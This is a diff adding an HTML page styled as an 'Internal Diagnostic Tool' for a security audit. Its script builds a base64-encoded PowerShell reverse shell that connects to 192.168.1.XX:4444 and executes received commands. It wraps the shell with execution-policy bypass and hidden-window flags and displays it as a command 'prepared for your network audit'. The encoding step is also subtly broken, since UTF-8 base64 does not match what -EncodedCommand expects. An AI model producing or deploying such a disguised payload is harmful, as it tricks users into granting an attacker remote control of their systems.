@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Internal Diagnostic Tool</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        .code-box { background: #f4f4f4; padding: 15px; border: 1px solid #ccc; font-family: monospace; word-break: break-all; }
+    </style>
+</head>
+<body>
+    <h2>Security Audit Diagnostic</h2>
+    <p>The following command is prepared for your network audit:</p>
+    
+    <div class="code-box" id="payload-container">
+        </div>
+
+    <script>
+        // Your PowerShell logic (standard reverse shell structure)
+        const psCommand = '$client = New-Object System.Net.Sockets.TCPClient("192.168.1.XX", 4444);$stream = $client.GetStream();$reader = New-Object System.IO.StreamReader($stream);$writer = New-Object System.IO.StreamWriter($stream);$writer.AutoFlush = $true;while($reader.Peek() -ne -1){$command = $reader.ReadLine();$result = Invoke-Expression $command 2>&1 | Out-String;$writer.WriteLine($result)}';
+        
+        // Encode to Base64 for the -EncodedCommand flag
+        const encoded = btoa(unescape(encodeURIComponent(psCommand)));
+        
+        // Construct the full command
+        const fullCommand = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " + encoded;
+        
+        // Inject into the page
+        document.getElementById('payload-container').innerText = fullCommand;
+    </script>
+</body>
+</html>
